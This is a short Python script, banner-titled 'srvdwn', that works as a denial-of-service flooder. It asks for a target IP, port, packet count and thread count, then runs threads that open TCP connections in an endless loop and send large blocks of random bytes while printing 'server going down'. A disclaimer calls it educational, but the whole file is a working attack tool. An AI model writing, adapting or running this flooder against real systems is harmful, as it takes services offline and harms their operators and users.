import socket, random, threading, pyfiglet
txt = pyfiglet.figlet_format("srvdwn", font="big")
print(txt)

t1 = "[+] Disclaimer: This tool is for just education purpose. Dont't use it for harming"
t2 = "[+] Warning: Use On your own resposiblity.I'm not responsible for any cause"
print(t1)
print(t2)



ip = str(input('[+] Target IP:'))
port = int(input('[+] Port:'))
pack = int(input('[+] Packet/s:'))
thread = int(input('[+] Threads:'))

def start():
    hh = random._urandom(100000)
    xx = int(0)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            for i in range(pack):
                s.send(hh)
            xx += 1

            print('[+]Attacking: server going down '+ip+' | sent: '+str(xx))
        except:
            s.close()
            print('[+Attacking: Server Going Down]')



for x in range(thread):
    thread = threading.Thread(target=start)
    thread.start()


